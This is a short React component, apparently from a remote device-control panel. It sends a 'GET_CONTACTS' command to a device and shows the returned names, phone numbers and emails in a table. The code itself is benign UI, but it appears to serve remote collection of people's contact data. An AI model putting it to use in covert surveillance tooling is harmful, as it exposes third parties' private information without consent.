import { useEffect } from 'react';
import { Card, CmdBtn, Table, Empty, useData, parseCcsData } from './shared';

export default function ContactsTab({ device }) {
  const { data, loading, load } = useData(device.id, 'contacts');
  useEffect(() => { load(); }, [device.id]);

  // CCS sends: {"type":"CONTACTS","data":"[{name,phones:[],emails:[]}]"}
  const contacts = parseCcsData(data);
  const rows = contacts.map(c => ({
    'Name':  c.name || c.displayName || '—',
    'Phone': Array.isArray(c.phones) ? c.phones.join(', ') : (c.phone || '—'),
    'Email': Array.isArray(c.emails) ? c.emails.join(', ') : (c.email || '—'),
  }));

  return (
    <Card title={`Contacts (${rows.length})`}
      action={<CmdBtn deviceId={device.id} action="GET_CONTACTS" label="📥 Fetch" onDone={load} />}>
      {loading && <div style={{ color: '#444', fontSize: 12 }}>loading…</div>}
      {!loading && !rows.length && <Empty text="No contacts — click Fetch" />}
      {rows.length > 0 && <Table headers={['Name', 'Phone', 'Email']} rows={rows} />}
    </Card>
  );
}
